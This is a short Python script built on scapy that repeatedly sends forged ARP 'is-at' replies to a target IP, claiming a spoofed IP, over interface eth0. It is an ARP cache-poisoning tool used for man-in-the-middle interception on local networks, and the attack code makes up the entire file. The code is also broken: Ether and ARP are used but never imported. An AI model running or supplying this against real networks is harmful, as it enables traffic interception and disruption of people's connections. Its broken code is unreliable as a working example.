#%%
import sys
import time
from scapy.all import sendp
# %%


if len(sys.argv) < 3:
	print (sys.argv[0] + ": <target> <spoof_ip>")
	sys.exit(0)

interface = "eth0"
target_ip = sys.argv[1] # TArget IP
fake_ip = sys.argv[2] # It's Our / Host Ip

ethernet =  Ether()
arp = ARP(pdst=target_ip, psrc=fake_ip, op="is-at")

packet = ethernet/arp


while True:
	sendp(packet, iface=interface, count=1)
	time.sleep(1)
